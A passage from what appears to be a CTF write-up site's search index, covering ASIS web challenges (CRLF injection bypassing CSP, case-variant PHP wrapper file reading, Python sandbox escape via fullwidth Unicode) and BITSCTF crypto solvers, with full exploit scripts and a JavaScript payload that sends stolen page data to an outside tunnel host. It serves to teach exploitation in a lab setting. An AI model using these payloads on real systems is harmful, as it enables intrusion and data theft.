&lt;attachment_url&gt;{ssrf_url}&lt;/attachment_url&gt;\n&lt;/message&gt;'''\n\n    resp = session.post(f\"{BASE_URL}/api/compose\", headers=headers, files={\"xml\": (None, xml)})\n    print(f\"Compose: {resp.status_code}\")\n\n    time.sleep(1)\n\n    # Retrieve flag from inbox\n    resp = session.get(f\"{BASE_URL}/api/inbox\", headers=headers)\n    for email in resp.json():\n        if email.get(\"subject\") == \"GetFlag\":\n            email_resp = session.get(f\"{BASE_URL}/api/mail/{email['id']}\", headers=headers)\n            email_data = email_resp.json()\n\n            for att in email_data.get(\"attachments\", []):\n                att_url = f\"/files{att.get('url')}\"\n                r = session.get(f\"{BASE_URL}{att_url}\")\n                if \"ASIS{\" in r.text:\n                    print(f\"\\nFLAG: {r.text}\")\n                    return\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>","tags":["web","asis-ctf"]},{"location":"asis-ctf/bookmarks/","title":"Bookmarks - Breaking CSP with CRLF","text":"<p>Category: Web Exploitation Flag: <code>FLAG{...}</code></p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/bookmarks/#the-challenge","title":"The Challenge","text":"<p>Bookmarks was a Flask application for managing bookmarks. Users could register, login, and save bookmarks to their dashboard. The interesting part was that it had a bot , when you reported a URL, a headless browser would visit it, register as a user with the flag as the username, log in, and browse around.</p> <p>My goal was to steal that username (the flag) from the bot's session.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/bookmarks/#the-bots-behavior","title":"The Bot's Behavior","text":"<p>Looking at the bot code, I could see the sequence:</p> <ol> <li>Bot visits my reported URL</li> <li>Waits 5 seconds</li> <li>Navigates to <code>/register</code> and creates an account with FLAG as the username</li> <li>Navigates to <code>/login</code> and logs in</li> <li>The dashboard displays \"Welcome, FLAG!\"</li> </ol> <p>The flag would appear on the dashboard, but only the bot could see it. I needed to somehow read the bot's dashboard.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/bookmarks/#finding-the-vulnerability","title":"Finding the Vulnerability","text":"<p>I examined the Flask application code and found something interesting in the <code>/dashboard</code> route:</p> <pre><code>@app.route(\"/dashboard\", methods=['GET'])\ndef dashboard():\n    user_id = session.get(\"user_id\")\n    username = None\n    with sqlite3.connect(DB_NAME) as conn:\n        cur = conn.execute(\"SELECT username FROM users WHERE id = ?\", (user_id,))\n        user = cur.fetchone()\n        username = user[0] if user else None\n\n    rendered = render_template(\"dashboard.html\", username=username)\n    response = make_response(rendered)\n    response.headers['X-User-' + username] = user_id  # VULNERABLE LINE\n\n    return response\n</code></pre> <p>The username was being inserted directly into an HTTP response header name: <code>X-User-{username}</code>.</p> <p>If I registered with a username containing CRLF characters (<code>\\r\\n</code>), I could: 1. End the current header 2. Inject new headers 3. End ALL headers with <code>\\r\\n\\r\\n</code> 4. Inject content into the response body</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/bookmarks/#testing-crlf-injection","title":"Testing CRLF Injection","text":"<p>I created a test account with this username:</p> <pre><code>test\\r\\n\\r\\n&lt;h1&gt;INJECTED&lt;/h1&gt;&lt;!--\n</code></pre> <p>When I visited <code>/dashboard</code>, the response looked like this:</p> <pre><code>HTTP/1.1 200 OK\nX-User-test\n\n&lt;h1&gt;INJECTED&lt;/h1&gt;&lt;!--: 12345\nContent-Security-Policy: default-src 'none'; style-src 'self';\n... rest of response\n</code></pre> <p>The CSP header ended up in the response body, not as an actual header. This meant CSP wasn't being enforced, and I could execute JavaScript.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/bookmarks/#the-timing-challenge","title":"The Timing Challenge","text":"<p>My attack needed careful timing:</p> <ol> <li>At 0 seconds: Bot visits my exploit page</li> <li>At 0 seconds: My page opens a popup and logs in as my CRLF user</li> <li>At 2 seconds: Popup navigates to <code>/dashboard</code> with my injected script</li> <li>At 5 seconds: Bot (main window) navigates to <code>/register</code></li> <li>At 6 seconds: Bot logs in - session cookie is now set</li> <li>At 8-12 seconds: My injected script runs <code>fetch(\"/dashboard\")</code> using the shared session cookie</li> </ol> <p>The key insight was that popup windows share the same cookie jar as their opener. Even though I couldn't read <code>window.opener.document</code> due to same-origin policy restrictions after navigation, I could still make <code>fetch()</code> requests that used the bot's session cookie.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/bookmarks/#the-exploit","title":"The Exploit","text":"<p>I created a malicious username with injected JavaScript:</p> <pre><code>def build_malicious_username():\n    script = \"\"\"\nvar T=\"https://my-tunnel-url.com\";\nfunction P(m){new Image().src=T+\"/c?m=\"+encodeURIComponent(m);}\nP(\"Script loaded\");\nfunction go(){\n    P(\"Fetching dashboard\");\n    fetch(\"/dashboard\").then(function(r){return r.text();}).then(function(h){\n        var m=h.match(/Welcome,([^&lt;]+)/);\n        if(m) P(\"FLAG:\"+m[1].trim());\n        else P(\"No match:\"+h.substr(0,100));\n    }).catch(function(e){P(\"Error:\"+e);});\n}\nsetTimeout(go,8000);\nsetTimeout(go,10000);\nsetTimeout(go,12000);\nP(\"Timers set\");\n\"\"\".replace(\"\\n\", \"\")\n\n    return f\"user\\r\\n\\r\\n&lt;script&gt;{script}&lt;/script&gt;&lt;!--\"\n</code></pre> <p>My exploit page opened a popup, logged in as the CRLF user, then navigated the popup to <code>/dashboard</code>. The navigation triggered the CRLF injection, my script loaded (CSP bypassed), and after waiting for the bot to log in, my script fetched <code>/dashboard</code> and extracted the flag from the Welcome message.</p> <p>The complete attack flow:</p> <pre><code>#!/usr/bin/env python3\nimport http.server\nimport requests\nimport base64\nimport threading\nimport time\nimport random\nimport string\n\nTARGET_URL = \"http://65.109.202.184\"\nINTERNAL_ORIGIN = \"http://web\"\nTUNNEL_URL = \"https://your-tunnel.trycloudflare.com\"\n\ndef main():\n    # Step 1: Register CRLF user\n    print(\"[1] Registering CRLF user...\")\n    requests.post(f\"{TARGET_URL}/register\",\n                  data={\"username\": MALICIOUS_USERNAME, \"password\": PASSWORD})\n\n    # Step 2: Verify injection works\n    print(\"[2] Verifying injection...\")\n    s = requests.Session()\n    s.post(f\"{TARGET_URL}/login\",\n           data={\"username\": MALICIOUS_USERNAME, \"password\": PASSWORD})\n    r = s.get(f\"{TARGET_URL}/dashboard\")\n\n    if \"&lt;script&gt;\" in r.text:\n        print(\"    [+] CRLF injection verified!\")\n    else:\n        print(\"    [-] Injection failed!\")\n        return\n\n    # Step 3: Start exploit server\n    print(\"[3] Starting server...\")\n    server = socketserver.TCPServer((\"0.0.0.0\", 8000), Handler)\n    threading.Thread(target=server.serve_forever, daemon=True).start()\n\n    # Step 4: Trigger bot\n    print(\"[4] Triggering bot...\")\n    requests.post(f\"{TARGET_URL}/report\",\n                  data={\"url\": f\"{TUNNEL_URL}/exploit.html\"})\n\n    print(\"\\n[*] Waiting for flag...\\n\")\n\n    while True:\n        time.sleep(1)\n</code></pre> <p>After a few seconds, I saw the callback with the flag:</p> <pre><code>[&gt;] Script loaded\n[&gt;] Timers set\n[&gt;] Fetching dashboard\n[&gt;] FLAG:FLAG{...}\n</code></pre>","tags":["web","asis-ctf"]},{"location":"asis-ctf/rick-gallery/","title":"Rick Gallery - The Case Sensitivity Trap","text":"<p>Category: Web Flag: <code>ASIS{...}</code></p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/rick-gallery/#the-gallery","title":"The Gallery","text":"<p>Rick Gallery was presented as a simple image gallery application with a Rick and Morty theme. When I first loaded it, I saw a collection of images and could click through them. The source code was provided, which made things easier.</p> <p>Looking at the PHP code, I found three main files: - <code>index.php</code> - The main gallery interface - <code>getpic.php</code> - An internal service to fetch images - <code>.htaccess</code> - Apache configuration restricting direct access to <code>getpic.php</code></p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/rick-gallery/#finding-the-vulnerability","title":"Finding the Vulnerability","text":"<p>The interesting part was in <code>index.php</code>. When processing POST requests, it checked for an <code>Image</code> header and ran it through some filters:</p> <pre><code>$blockedProtocols = [\n    \"http://\", \"https://\", \"ftp://\", \"ftps://\",\n    \"file://\", \"data://\", \"expect://\", \"php://\",\n    \"passwd\"\n];\n\nforeach ($blockedProtocols as $proto) {\n    if (strpos($raw, $proto) !== false) {\n        $raw = \"\";\n        break;\n    }\n}\n</code></pre> <p>The application was trying to prevent me from using dangerous PHP wrappers like <code>php://</code> or <code>file://</code> to read arbitrary files. But I noticed something: all the blocked strings were lowercase.</p> <p>I remembered that PHP stream wrappers are case-insensitive. So while <code>php://filter/read=convert.base64-encode/resource=/etc/passwd</code> would be blocked, <code>PHP://filter/read=convert.base64-encode/resource=/etc/passwd</code> would sail right through the filter.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/rick-gallery/#testing-the-theory","title":"Testing the Theory","text":"<p>I started with a simple test. I sent a POST request with the <code>Image</code> header set to <code>/etc/hostname</code> (no wrapper needed for absolute paths):</p> <pre><code>import requests\nimport base64\n\nTARGET = \"http://65.109.194.105:8080/index.php\"\n\nheaders = {\"Image\": \"/etc/hostname\"}\nr = requests.post(TARGET, headers=headers)\ncontent = base64.b64decode(r.text.strip())\nprint(content)\n# Output: b'7be458eda235\\n'\n</code></pre> <p>It worked. The application was passing my input to <code>file_get_contents()</code> in <code>getpic.php</code>, which happily read any file I specified.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/rick-gallery/#hunting-for-the-flag","title":"Hunting for the Flag","text":"<p>Now I had local file inclusion, but I needed to find where the flag was stored. I started checking common locations:</p> <pre><code>def read_file(path):\n    headers = {\"Image\": path}\n    r = requests.post(TARGET, headers=headers)\n    if '&lt;br /&gt;' in r.text or 'Warning' in r.text:\n        return None\n    return base64.b64decode(r.text.strip())\n\n# Tried various paths\nread_file(\"/flag.txt\")           # Not found\nread_file(\"/etc/passwd\")         # Blocked by \"passwd\" filter\nread_file(\"/proc/self/environ\")  # Found, but no flag\nread_file(\"/var/www/flag.txt\")   # Not found\n</code></pre> <p>I kept enumerating different paths. CTF flags are often placed in obvious but sometimes overlooked locations. After trying several standard paths, I checked <code>/tmp/</code>:</p> <pre><code>content = read_file(\"/tmp/flag.txt\")\nprint(content.decode())\n# ASIS{...}\n</code></pre> <p>There it was. The flag was sitting in <code>/tmp/flag.txt</code> the whole time.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/rick-gallery/#the-exploit","title":"The Exploit","text":"<p>Here's the final exploit script:</p> <pre><code>#!/usr/bin/env python3\nimport requests\nimport base64\nimport sys\n\ndef read_file(target, path):\n    if not target.endswith('.php'):\n        target = target.rstrip('/') + '/index.php'\n\n    headers = {\"Image\": path}\n    r = requests.post(target, headers=headers, timeout=10)\n\n    # Check for error response\n    if '&lt;br /&gt;' in r.text or 'Warning' in r.text:\n        return None\n\n    try:\n        decoded = base64.b64decode(r.text.strip())\n        if b'Warning' in decoded:\n            return None\n        return decoded\n    except:\n        return None\n\ndef main():\n    target = sys.argv[1] if len(sys.argv) &gt; 1 else \"http://target:8080/\"\n\n    # Read the flag\n    flag = read_file(target, \"/tmp/flag.txt\")\n\n    if flag:\n        print(f\"[+] FLAG: {flag.decode()}\")\n    else:\n        print(\"[-] Flag not found at /tmp/flag.txt\")\n\n        # Try alternative locations\n        alternatives = [\n            \"/flag.txt\",\n            \"/flag\",\n            \"/home/flag.txt\",\n            \"/var/www/flag.txt\",\n            \"/root/flag.txt\",\n        ]\n\n        for path in alternatives:\n            content = read_file(target, path)\n            if content:\n                print(f\"[+] Found at {path}: {content.decode()}\")\n                break\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>","tags":["web","asis-ctf"]},{"location":"asis-ctf/rick-gallery/#references","title":"References","text":"<ul> <li>PHP Stream Wrappers Documentation</li> <li>HackTricks - File Inclusion</li> <li>PayloadsAllTheThings - File Inclusion</li> </ul>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/","title":"Sanchess - Making Rick Angry","text":"<p>Category: Web Exploitation Flag: <code>ASIS{y0u_M2D3_r!cK_@NGRY}</code></p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#first-impressions","title":"First Impressions","text":"<p>The challenge description was cryptic: \"Guide Rick through the shadows to discover Morty, armed only with peculiar tools.\" When I loaded the page, I found a Rick and Morty themed chess-like game. Rick stood on one corner of an 8x8 board, and Morty was somewhere else. My job was to program Rick's moves to reach Morty.</p> <p>What made it interesting was the move system. I could create simple moves like \"up\" or \"down\", but I could also create conditional moves - if some condition was true, move in one direction, otherwise move in another direction. The conditions could check things like the distance to Morty or the color of the current cell.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#finding-the-injection","title":"Finding the Injection","text":"<p>I started poking at the <code>/simulate</code> endpoint, which accepted JSON describing Rick's moves. The conditional moves were particularly interesting because they had a <code>value</code> field that was compared against the calculated distance.</p> <p>I tried a simple test: <pre><code>{\"type\": \"distance\", \"op\": \"&gt;\", \"value\": \"1+1\"}\n</code></pre></p> <p>Rick moved! The server had evaluated <code>1+1</code> to <code>2</code> and compared the distance against it. This was Python expression injection - I could make the server evaluate arbitrary Python code.</p> <p>I tested what functions were available: <pre><code>{\"type\": \"distance\", \"op\": \"&gt;\", \"value\": \"len('hello')\"}  # Works - evaluates to 5\n{\"type\": \"distance\", \"op\": \"&gt;\", \"value\": \"int('10')\"}     # Works - evaluates to 10\n</code></pre></p> <p>But when I tried dangerous functions like <code>open()</code> or <code>__import__()</code>, they were blocked. The application had some kind of filter or sandbox.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#breaking-out","title":"Breaking Out","text":"<p>Since I couldn't use <code>open()</code> directly, I needed to find another way to read files. Python's class hierarchy is famous for sandbox escapes. Every object in Python inherits from a base class, and by traversing the subclasses, you can sometimes find dangerous functionality that wasn't explicitly blocked.</p> <p>I tried this expression: <pre><code>().__class__.__base__.__subclasses__()\n</code></pre></p> <p>This gave me access to all loaded Python classes. I scrolled through them looking for something useful. Then I found it: <code>FileLoader</code>. This is a class from Python's import system, and it has a <code>get_data()</code> method that can read files.</p> <p>The expression looked like this: <pre><code>[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')\n</code></pre></p> <p>This found the FileLoader class, instantiated it, and called <code>get_data()</code> to read the flag file. But I couldn't just read the flag directly - I needed to extract it one character at a time using a boolean oracle.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#the-boolean-oracle","title":"The Boolean Oracle","text":"<p>The challenge used Manhattan distance to calculate how far Rick was from Morty. With Rick at position (0,0) and Morty at (7,1), the distance was 8.</p> <p>When I created a conditional move with <code>distance &gt; value</code>, the server would: - Move Rick DOWN if the condition was TRUE (distance &gt; value) - Move Rick UP if the condition was FALSE (distance &lt;= value)</p> <p>So I could tell if my expression evaluated to less than 8 or not by watching which direction Rick moved.</p> <p>My strategy was to read one character of the flag at a time and multiply the comparison result by 100: <pre><code>(flag_bytes[position] == ascii_code) * 100\n</code></pre></p> <p>If the character matched, this would evaluate to 100, and <code>8 &gt; 100</code> would be FALSE (Rick moves UP). If the character didn't match, this would evaluate to 0, and <code>8 &gt; 0</code> would be TRUE (Rick moves DOWN).</p> <p>So Rick moving UP meant I found the right character.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#the-first-flag","title":"The First Flag","text":"<p>I wrote a Python script to automate the extraction:</p> <pre><code>def check_char(pos, char_code):\n    byte_expr = \"[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')\"\n    expr = f\"({byte_expr}[{pos}]=={char_code})*100\"\n\n    payload = {\n        \"rick\": {\"row\": 0, \"col\": 0},\n        \"morty\": {\"row\": 7, \"col\": 1},\n        \"moves\": [{\n            \"type\": \"conditional\",\n            \"condition\": {\"type\": \"distance\", \"op\": \"&gt;\", \"value\": expr},\n            \"then\": \"down\",\n            \"else\": \"up\"\n        }]\n    }\n\n    r = session.post(f\"{BASE_URL}/simulate\", json=payload)\n    path = r.json().get(\"path\", [])\n\n    # UP (row stays 0) means match found\n    return path[1]['row'] == 0\n</code></pre> <p>I ran it and watched the flag appear character by character: <pre><code>A\nAS\nASI\nASIS\nASIS{\nASIS{y\nASIS{y0\n...\nASIS{y0u_M2D3_r!cK_@NGRY}\n</code></pre></p> <p>Perfect. But then something changed.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#the-patch","title":"The Patch","text":"<p>The challenge organizers patched it mid-competition. They added filters to block keywords like \"open\", \"read\", \"flag\", \"eval\", and even underscores. My FileLoader approach no longer worked.</p> <p>I was stuck for a while. Then I remembered something I'd read about Unicode normalization attacks.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#unicode-normalization-bypass","title":"Unicode Normalization Bypass","text":"<p>Many web frameworks normalize Unicode characters before processing them. There's a range of Unicode characters called \"fullwidth\" characters (U+FF01 to U+FF5E) that look slightly different but normalize to regular ASCII.</p> <p>For example: - <code>\uff4f\uff50\uff45\uff4e</code> (fullwidth) normalizes to <code>open</code> (ASCII) - <code>\uff52\uff45\uff41\uff44</code> (fullwidth) normalizes to <code>read</code> (ASCII)</p> <p>The key insight: the filter checked for \"open\" and \"read\" before normalization, but Python evaluated the expression after normalization.</p> <p>I wrote a function to convert ASCII to fullwidth: <pre><code>def to_fullwidth(s):\n    res = \"\"\n    for char in s:\n        code = ord(char)\n        if 33 &lt;= code &lt;= 126:\n            res += chr(code + 0xFEE0)  # Shift to fullwidth\n        else:\n            res += char\n    return res\n</code></pre></p> <p>Now I could bypass the filters: <pre><code>func_open = to_fullwidth(\"open\")   # \uff4f\uff50\uff45\uff4e\nfunc_read = to_fullwidth(\"read\")   # \uff52\uff45\uff41\uff44\nfname = \"'fl'+'ag.txt'\"             # Bypass \"flag\" filter with concatenation\n\npayload_expr = f\"{func_open}({fname}).{func_read}()[{pos}] == '{char}'\"\n</code></pre></p> <p>The filter saw <code>\uff4f\uff50\uff45\uff4e</code> and <code>\uff52\uff45\uff41\uff44</code> - which didn't match its blocklist of \"open\" and \"read\". But after normalization, Python executed <code>open('fl'+'ag.txt').read()</code> which worked perfectly.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#getting-the-flag-again","title":"Getting the Flag Again","text":"<p>I updated my script with the Unicode bypass and ran it again. This time it worked even with the filters in place:</p> <pre><code>[*] Starting Unicode Normalization Bypass...\n[+] Flag: A\n[+] Flag: AS\n[+] Flag: ASI\n...\n[+] Flag: ASIS{y0u_M2D3_r!cK_@NGRY}\n\nFinal Flag: ASIS{y0u_M2D3_r!cK_@NGRY}\n</code></pre> <p>The flag translates to \"you made Rick angry\" - fitting, given how much time I spent on this challenge.</p>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#exploit-scripts","title":"Exploit Scripts","text":"","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#pre-patch-version","title":"Pre-Patch Version","text":"<pre><code>#!/usr/bin/env python3\nimport requests\nimport string\nimport time\n\nBASE_URL = \"http://65.109.194.105:9090\"\nSESSION = requests.Session()\n\ndef test_expr(expr, distance=8):\n    morty_row = min(distance, 7)\n    morty_col = max(0, distance - 7)\n\n    payload = {\n        \"rick\": {\"row\": 0, \"col\": 0},\n        \"morty\": {\"row\": morty_row, \"col\": morty_col},\n        \"moves\": [{\n            \"type\": \"conditional\",\n            \"condition\": {\"type\": \"distance\", \"op\": \"&gt;\", \"value\": expr},\n            \"then\": \"down\",\n            \"else\": \"up\"\n        }]\n    }\n\n    try:\n        r = SESSION.post(f\"{BASE_URL}/simulate\", json=payload, timeout=10)\n        data = r.json()\n        if \"Error\" in data:\n            return None\n        path = data.get(\"path\", [])\n        if len(path) &gt;= 2:\n            return path[1][\"row\"] &gt; path[0][\"row\"]\n        return None\n    except:\n        return None\n\ndef check_char(pos, char_code):\n    byte_expr = \"[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')\"\n    expr = f\"({byte_expr}[{pos}]=={char_code})*100\"\n    result = test_expr(expr)\n\n    if result is None:\n        return None\n    return result == False  # False means match\n\ndef extract_flag():\n    charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + \"_{}-!@#$%^&amp;*().\"\n    flag = \"\"\n\n    print(\"[*] Extracting flag...\")\n\n    for pos in range(100):\n        found = False\n        for char in charset:\n            if check_char(pos, ord(char)):\n                flag += char\n                print(f\"    [{pos}] '{char}' -&gt; {flag}\")\n                found = True\n                break\n            time.sleep(0.02)\n\n        if not found:\n            print(f\"    [{pos}] No match found - END\")\n            break\n\n        if char == '}':\n            print(\"\\n[+] Flag complete!\")\n            break\n\n    return flag\n\nif __name__ == \"__main__\":\n    flag = extract_flag()\n    print(f\"\\nFLAG: {flag}\")\n</code></pre>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#post-patch-version-unicode-bypass","title":"Post-Patch Version (Unicode Bypass)","text":"<pre><code>#!/usr/bin/env python3\nimport requests\nimport sys\n\nBASE_URL = \"http://65.109.194.105:9090/\"\nSESSION = requests.Session()\n\ndef to_fullwidth(s):\n    res = \"\"\n    for char in s:\n        code = ord(char)\n        if 33 &lt;= code &lt;= 126:\n            res += chr(code + 0xFEE0)\n        else:\n            res += char\n    return res\n\ndef send_move(payload_expr):\n    final_payload = f\"({payload_expr}) * 100\"\n\n    json_body = {\n        \"rick\": {\"row\": 0, \"col\": 0},\n        \"morty\": {\"row\": 7, \"col\": 1},\n        \"moves\": [{\n            \"type\": \"conditional\",\n            \"condition\": {\"type\": \"distance\", \"op\": \"&gt;\", \"value\": final_payload},\n            \"then\": \"down\",\n            \"else\": \"up\"\n        }]\n    }\n\n    try:\n        r = SESSION.post(f\"{BASE_URL}/simulate\", json=json_body, timeout=5)\n        if r.status_code != 200:\n            return None\n        data = r.json()\n        if \"error\" in data or not data.get(\"path\"):\n            return None\n\n        path = data[\"path\"]\n        if len(path) &lt; 2:\n            return None\n\n        # UP (Row stays 0) = MATCH\n        if path[1]['row'] == 0:\n            return True\n        else:\n            return False\n    except Exception:\n        return None\n\ndef brute_force_flag():\n    print(\"[*] Starting Unicode Normalization Bypass...\")\n\n    func_open = to_fullwidth(\"open\")\n    func_read = to_fullwidth(\"read\")\n    fname = \"'fl'+'ag.txt'\"\n\n    print(f\"[*] Payload Template: {func_open}({fname}).{func_read}()[pos]\")\n\n    flag = \"\"\n    charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!?\"\n\n    for pos in range(0, 50):\n        found = False\n        sys.stdout.write(f\"\\r[{pos}] \")\n\n        for char in charset:\n            safe_char = char\n            if char == \"'\":\n                safe_char = \"\\\\'\"\n\n            expr = f\"{func_open}({fname}).{func_read}()[{pos}] == '{safe_char}'\"\n\n            res = send_move(expr)\n\n            if res is True:\n                flag += char\n                print(f\"\\r[+] Flag: {flag}                 \")\n                found = True\n                break\n\n        if not found:\n            print(f\"\\n[!] Stalled at position {pos}. End of flag?\")\n            break\n\n    print(f\"\\nFinal Flag: {flag}\")\n\nif __name__ == \"__main__\":\n    brute_force_flag()\n</code></pre>","tags":["web","asis-ctf"]},{"location":"asis-ctf/sanchess/#references","title":"References","text":"<ul> <li>Python Sandbox Escape Techniques</li> <li>Unicode Normalization Attacks</li> <li>Fullwidth Unicode Characters</li> </ul>","tags":["web","asis-ctf"]},{"location":"bits/","title":"BITSCTF","text":"<p>These are the BITSCTF crypto writeups I worked through.</p>"},{"location":"bits/savemefromthishell-aes/","title":"SaveMeFromThisHell \u2014 AES (custom) Writeup + Solvers","text":"<p>Category: Crypto</p>","tags":["crypto","bitsctf"]},{"location":"bits/savemefromthishell-aes/#what-i-was-given","title":"What I Was Given","text":"<p>From <code>README.md</code>, I noted: - The challenge is \u201cAES\u201d and the flag format is <code>BITSCTF{...}</code>.</p> <p>From <code>aes.py</code>, I saw: - It is not standard AES:   - The S-box is custom: <code>SBOX[x] = gf_pow(x, 23) ^ 0x63</code>.   - The number of rounds is only 4 (<code>AES.ROUNDS = 4</code>), not 10/12/14.</p> <p>From <code>output(1).txt</code>, I pulled: - <code>key_hint</code> (hex) is a 13-byte prefix of the AES key. - <code>encrypted_flag</code> (hex) is the flag ciphertext (64 bytes = 4 blocks). - 1000 known <code>(plaintext, ciphertext)</code> pairs (each 16 bytes, hex).</p> <p>So the AES key is 16 bytes, and I knew 13 bytes \u2192 only 3 bytes were unknown: - Search space = <code>2^(8*3) = 2^24 = 16,777,216</code> candidates. That was totally brute-forceable with a fast check.</p>","tags":["crypto","bitsctf"]},{"location":"bits/savemefromthishell-aes/#attack-plan","title":"Attack Plan","text":"<ol> <li>I parsed <code>output(1).txt</code>:</li> <li>read <code>key_hint</code></li> <li>read one (or a few) plaintext/ciphertext sample pairs</li> <li>read <code>encrypted_flag</code></li> <li>I brute-forced the last 3 key bytes:</li> <li>candidate key = <code>key_hint || b0 || b1 || b2</code></li> <li>encrypt one known plaintext block with candidate key</li> <li>if it matches the known ciphertext block, verify with a second sample (optional)</li> <li>I decrypted <code>encrypted_flag</code>:</li> <li>ECB mode (it\u2019s block-by-block AES with no IV shown)</li> <li>remove PKCS#7 padding</li> <li>I printed the flag.</li> </ol>","tags":["crypto","bitsctf"]},{"location":"bits/savemefromthishell-aes/#solver-1-full-brute-force-key-recovery-flag-decryption","title":"Solver 1 \u2014 Full brute-force key recovery + flag decryption","text":"<p>Place this script in the same directory as <code>aes.py</code> and <code>output(1).txt</code>.</p> <p>```python</p>","tags":["crypto","bitsctf"]},{"location":"bits/savemefromthishell-aes/#usrbinenv-python3","title":"!/usr/bin/env python3","text":"<p>import binascii from pathlib import Path</p>","tags":["crypto","bitsctf"]},{"location":"bits/savemefromthishell-aes/#import-the-provided-aes-implementation","title":"Import the provided AES implementation","text":"<p>from aes import AES</p> <p>def pkcs7_unpad(data: bytes) -&gt; bytes:     if not data:         raise ValueError(\"empty\")     pad = data[-1]     if pad == 0 or pad &gt; 16:         raise ValueError(\"bad padding length\")     if data[-pad:] != bytes([pad]) * pad:         raise ValueError(\"bad padding bytes\")     return data[:-pad]</p> <p>def parse_output(path: str):     lines = Path(path).read_text().splitlines()</p> <pre><code>key_hint = bytes.fromhex(lines[0].split(\":\")[1].strip())\nencrypted_flag = bytes.fromhex(lines[1].split(\":\")[1].strip())\n\n# samples start after \"samples:\"\ni = lines.index(\"samples:\") + 1\nsamples = []\nfor line in lines[i:]:\n    if not line.strip():\n        continue\n    pt_hex, ct_hex = line.split(\",\")\n    pt = bytes.fromhex(pt_hex.strip())\n    ct = bytes.fromhex(ct_hex.strip())\n    samples.append((pt, ct))\n\nreturn key_hint, encrypted_flag, samples\n</code></pre> <p>def check_key(key: bytes, samples):     aes = AES(key)     # check 2 samples to avoid rare false positives     for (pt, ct) in samples[:2]:         if aes.encrypt(pt) != ct:             return False     return True</p> <p>def recover_key(key_hint: bytes, samples):     assert len(key_hint) == 13, \"key_hint must be 13 bytes\"     prefix = key_hint</p> <pre><code># Brute-force 24 bits: 0x000000 .. 0xFFFFFF\nfor x in range(1 &lt;&lt; 24):\n    suffix = bytes([(x &gt;&gt; 16) &amp; 0xFF, (x &gt;&gt; 8) &amp; 0xFF, x &amp; 0xFF])\n    key = prefix + suffix\n    if check_key(key, samples):\n        return key\n\n    # tiny progress print (optional)\n    if x % 0x200000 == 0 and x != 0:\n        print(f\"checked {x:#x} candidates...\")\n\nraise RuntimeError(\"key not found\")\n</code></pre> <p>def decrypt_flag(key: bytes, encrypted_flag: bytes) -&gt; bytes:     aes = AES(key)     if len(encrypted_flag) % 16 != 0:         raise ValueError(\"ciphertext not multiple of 16 bytes\")</p> <pre><code>pt = b\"\".join(aes.decrypt(encrypted_flag[i:i+16]) for i in range(0, len(encrypted_flag), 16))\nreturn pkcs7_unpad(pt)\n</code></pre> <p>def main():     key_hint, encrypted_flag, samples = parse_output(\"output(1).txt\")     print(f\"[+] key_hint = {key_hint.hex()} ({len(key_hint)} bytes)\")     print(f\"[+] samples  = {len(samples)} blocks\")     print(f\"[+] flag ct  = {len(encrypted_flag)} bytes\")</p> <pre><code>key = recover_key(key_hint, samples)\nprint(f\"[+] recovered key = {key.hex()}\")\n\nflag = decrypt_flag(key, encrypted_flag)\nprint(f\"[+] flag = {flag.decode(errors='replace')}\")\n</code></pre> <p>if name == \"main\":     main()</p>","tags":["crypto","bitsctf"]},{"location":"bits/too-genus-curve/","title":"BITSCTF Crypto Writeup (First-Person) - Too Genus Curve","text":"<p>Category: Crypto</p> <p>I solved this challenge by turning the genus-2 Jacobian discrete log into two elliptic-curve discrete logs, then using the recovered scalar to decrypt the flag ciphertext.</p>","tags":["crypto","bitsctf"]},{"location":"bits/too-genus-curve/#1-what-i-got","title":"1. What I Got","text":"<p>I was given:</p> <ul> <li>A prime field <code>p</code></li> <li>A hyperelliptic curve <code>y^2 = f(x)</code> with <code>deg(f)=6</code></li> <li>Two Jacobian divisors in Mumford representation:</li> <li><code>G = (G_u, G_v)</code></li> <li><code>Q = (Q_u, Q_v)</code></li> <li><code>enc_flag</code> as hex</li> </ul> <p>The hint text said the curve parameters looked \"insane\", so I expected a structural weakness rather than brute-force DLP.</p>","tags":["crypto","bitsctf"]},{"location":"bits/too-genus-curve/#2-my-main-observation","title":"2. My Main Observation","text":"<p>I computed a shift <code>x -&gt; X + t</code> with:</p> <p><code>t = -f5 / (6*f6) mod p</code></p> <p>When I substituted this shift into <code>f</code>, the odd coefficients vanished, and the polynomial became:</p> <p><code>f(X+t) = 1 + a*X^6</code></p> <p>This is huge: the curve becomes</p> <p><code>C': y^2 = 1 + aX^6</code></p> <p>which is bi-elliptic and splits via maps to elliptic curves:</p> <ul> <li><code>E1: V^2 = aU^3 + 1</code> with map <code>(X,Y) -&gt; (U,V) 